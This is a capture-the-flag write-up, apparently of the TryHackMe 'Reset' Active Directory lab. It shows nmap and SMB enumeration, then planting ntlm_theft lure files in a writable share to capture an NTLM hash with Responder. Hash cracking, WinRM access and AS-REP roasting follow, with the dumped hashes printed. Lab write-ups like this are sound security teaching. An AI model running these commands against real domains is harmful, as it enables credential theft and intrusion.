![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b80efa3b-6d37-4d1c-8644-d3ec7599a228)

first enumeration with nmap 

```shell
# Nmap 7.93 scan initiated Sat Feb 10 17:28:13 2024 as: nmap -p- --min-rate 1000 -v -Pn -oN full.tcp 10.10.230.101
Nmap scan report for ip-10-10-230-101.eu-west-1.compute.internal (10.10.230.101)
Host is up (0.00056s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
7680/tcp  open  pando-pub
9389/tcp  open  adws
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49703/tcp open  unknown
MAC Address: 02:24:96:14:7C:EB (Unknown)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Feb 10 17:30:33 2024 -- 1 IP address (1 host up) scanned in 140.66 seconds
```
we can see the open ports, let's run nmap default scripts scan to know what services are running on these ports

```shell
# Nmap 7.93 scan initiated Sat Feb 10 17:34:41 2024 as: nmap -sCV -T4 -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,7680,9389 -Pn -oN service.tcp
 10.10.230.101                 
Nmap scan report for ip-10-10-230-101.eu-west-1.compute.internal (10.10.230.101)
Host is up (0.00045s latency).                                                
                                                                              
PORT     STATE    SERVICE       VERSION    
53/tcp   open     domain        Simple DNS Plus
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-10 17:34:49Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open     tcpwrapped
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp open     tcpwrapped
3389/tcp open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2024-01-25T21:01:31                                                                                                                     
|_Not valid after:  2024-07-26T21:01:31 
| rdp-ntlm-info:                                                                                                                                            
|   Target_Name: THM                                                                                                                                        
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-10T17:34:49+00:00
|_ssl-date: 2024-02-10T17:35:29+00:00; 0s from scanner time.
5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp filtered pando-pub
9389/tcp open     mc-nmf        .NET Message Framing
MAC Address: 02:24:96:14:7C:EB (Unknown)
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-10T17:34:50
|_  start_date: N/A
|_nbstat: NetBIOS name: HAYSTACK, NetBIOS user: <unknown>, NetBIOS MAC: 022496147ceb (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 10 17:35:29 2024 -- 1 IP address (1 host up) scanned in 48.40 seconds
```
now we know what services are running on these ports

## Enumerating smb

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/reset]
└─$ smbclient -L HayStack.thm.corp -N 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to HayStack.thm.corp failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
checking for null share session, we can see a Data share. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/00c95ff9-7b5e-4e3c-99f9-6b0941815616)

checking the share, we can see some files, we downloaded the files. 

```shell
└─$ cat cjexnwvf.e0i.txt
Subject: Welcome to Reset -Dear <USER>,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone.The initial passowrd is: ResetMe123!We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role.Best regards,The Reset Team 
```
checking the content of the txt file, we got a password `ResetMe123!`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5e223f93-149f-4968-8463-5715d888acb6)

we have write permission to the smb server, 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/dc3c8f28-22d9-4686-8eab-bccdd5fc58e7)

after long research we got how to phish and steal ntlm hash using responder with this ntlm_theft payload. [payload_gen](https://github.com/Greenwolf/ntlm_theft).

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2b0c83d9-912b-4342-9f76-e4f45ae42036)

```shell
┌──(root㉿kali)-[~/ntlm_theft]                                                                                                                              
└─# python ntlm_theft.py                                                                                                                                    
usage: ntlm_theft.py --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>
ntlm_theft.py: error: the following arguments are required: -g/--generate, -s/--server, -f/--filename
                                                                                                                                                            
┌──(root㉿kali)-[~/ntlm_theft]                                                
└─# python ntlm_theft.py --generate all --server 10.10.135.72 --filename testing 
Created: testing/testing.scf (BROWSE TO FOLDER)              
Created: testing/testing-(url).url (BROWSE TO FOLDER)
Created: testing/testing-(icon).url (BROWSE TO FOLDER)                        
Created: testing/testing.lnk (BROWSE TO FOLDER)                               
Created: testing/testing.rtf (OPEN)                                           
Created: testing/testing-(stylesheet).xml (OPEN)                              
Created: testing/testing-(fulldocx).xml (OPEN)                                
Created: testing/testing.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: testing/testing-(includepicture).docx (OPEN)
Created: testing/testing-(remotetemplate).docx (OPEN)
Created: testing/testing-(frameset).docx (OPEN)
Created: testing/testing-(externalcell).xlsx (OPEN)
Created: testing/testing.wax (OPEN)
Created: testing/testing.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: testing/testing.asx (OPEN)
Created: testing/testing.jnlp (OPEN)
Created: testing/testing.application (DOWNLOAD AND OPEN)
Created: testing/testing.pdf (OPEN AND ALLOW)
Created: testing/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: testing/Autorun.inf (BROWSE TO FOLDER)
Created: testing/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```
run the exploit to see how it works and generated some payloads we can use. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5ff14951-88e7-4859-9ca1-d69844953aef)

payloads generated. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/09508a3f-f1b2-49f2-9b9b-760be16429bd)

fire up responder

```shell
┌──(root㉿kali)-[~/ntlm_theft/testing]
└─# smbclient \\\\HayStack.thm.corp\\Data -N
Try "help" to get a list of possible commands.
smb: \> cd onboarding\
smb: \onboarding\> put testing.lnk 
putting file testing.lnk as \onboarding\testing.lnk (45.0 kb/s) (average 45.0 kb/s)
smb: \onboarding\> dir 
  .                                   D        0  Sat Feb 10 18:04:15 2024
  ..                                  D        0  Sat Feb 10 18:04:15 2024
  101.nmap                            A     1260  Sat Feb 10 17:51:00 2024
  44ocn1as.elc.txt                    A      521  Mon Aug 21 18:21:59 2023
  4r2skt4b.sa2.pdf                    A  4700896  Mon Jul 17 08:11:53 2023
  nfdpqxro.a0w.pdf                    A  3032659  Mon Jul 17 08:12:09 2023
  testing.lnk                         A     2164  Sat Feb 10 18:04:15 2024

                7863807 blocks of size 4096. 3023074 blocks available
smb: \onboarding\> 
```
uploaded a testing.lnk file and check back responder

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5fabef38-7548-4345-b000-ea9373c00d9a)

boom we got an NTLM hash for user `THM\AUTOMATE`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a76da70b-55e7-4154-ad8d-eb94106722ef)

using hashcat to crack the hash, we got the password. 

## Initial foothold - winrm 

```shell
┌──(root㉿kali)-[~]
└─# crackmapexec winrm 10.10.230.101 -u automate -p redacted
SMB         10.10.230.101   5985   HAYSTACK         [*] Windows 10.0 Build 17763 (name:HAYSTACK) (domain:thm.corp)
HTTP        10.10.230.101   5985   HAYSTACK         [*] http://10.10.230.101:5985/wsman
WINRM       10.10.230.101   5985   HAYSTACK         [+] thm.corp\automate:redacted (Pwn3d!)
```
using crackmapexec to check for access, we can see that we can login winrm using the cred.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/4a1bd524-0ca0-41c5-85a5-e62d35a6688f)

now we login winrm using the creds


## Privilege Escalation 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/reset]
└─$ impacket-GetNPUsers -dc-ip 10.10.28.85 -outputfile hashes.asreproast1 thm.corp/automate
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

Password:
Name           MemberOf                                                      PasswordLastSet             LastLogon                   UAC      
-------------  ------------------------------------------------------------  --------------------------  --------------------------  --------
ERNESTO_SILVA  CN=Gu-gerardway-distlist1,OU=AWS,OU=Stage,DC=thm,DC=corp      2023-07-18 17:21:44.224354  <never>                     0x410200 
TABATHA_BRITT  CN=Gu-gerardway-distlist1,OU=AWS,OU=Stage,DC=thm,DC=corp      2023-08-21 21:32:59.571306  2024-02-12 10:53:43.351860  0x410200 
LEANN_LONG     CN=CH-ecu-distlist1,OU=Groups,OU=OGC,OU=Stage,DC=thm,DC=corp  2023-07-18 17:21:44.161807  2023-06-16 13:16:11.147334  0x410200 



$krb5asrep$23$ERNESTO_SILVA@THM.CORP:b78d6389727807da2be0c7639f70f6c8$104a3b6f36e4c2b5d64c278e237c422716314c44b2d2e3cb6af1b41f9971b6912b887fcccde2223bded36671b22a952776efd7f8903b060359f2ad304d2014b156c78cf31866cc94faf267e38eee547a55b1fd0725f5e744dd1510f269ca70717e3704b2992b2637d83bb4ff40791680dd2e3d1f70c95d1be9ab9fc648056c5b99f366668d0c6c268b0458ccd4247e6a94d170655e7dbf74f397154d705084970430f4aa659b6311332caf097c28605f6a969bdaaf0f6cdc831253c3e65f085659e37c72ba58131f19e93f8ab86830de415b9498b04228610d2e01798ebff570ad9c5e43
$krb5asrep$23$TABATHA_BRITT@THM.CORP:966df1fbdb26214dc1b709d6fc90f60f$8c1f5a04dd24d0e88a10d1bc9c966e63f8d3141ffb078cafbd64a658bd7a4e8d5d505763a4f9ce60e59764de2206cbaa872fb32dcbbf8c53496d61b91ef7c66d2625eaed0857e78f9ad34f48f33c602a059c29732c5d654150be45211ab2e87c5f546c29f11fe93c590ee0ee720f12484f271cc90500a3d88126f2981a3728a6dbf10d05c666cbd892ae0962c0bfdf4711174a62489b47d600c7d213b600263566c50ac032a6a6cc8ef8834e5ce5df968c3ad17b8c077b9ce7e7c92ba38a56eba23160dddd5849950a38650be645f8bde0892de80e27fa8e9901e59313be9cd88b70a250
$krb5asrep$23$LEANN_LONG@THM.CORP:6c5b61225737a8ad7b97714634e272a9$f35ad11a2ad25939355c70b5a39c8d77b7fe91c6449ae641d321cb527e0b150f3bd47586f589fbfab616744489420c8273db4695cf23ea531b77a856e6e588fe079a1ed15e0d1c1b2df25b79ae6b6c6dd3b9711204fce4c223f877738b2cbae83d1ebaeb24e7cebf3c4ad307686be910c2da16cf18ae04b8d7d04b0ab0fd75fc4a41e609d35c718b9beed58b0694338fd125a5c9f94c8c012c998c653dc766f020576e33d630f9802c8b685df3b0039b25f10ea3812c5e76e9132f7e01d04550e4ba6434cf191b85ced57582dc61827a48b05414c6aac77390bf4e42c64f3293281f5296
```
checkng for list of kerberoastable accts, we got some hashes. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/6656b0f6-80e3-4370-87cd-9c6e56672008)

cracked the hash. we got password for user `TABATHA_BRITT`.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/222642f1-16e0-4b29-b99d-1fd87b7b50d8)

login rdp as user `TABATHA_BRITT`. 


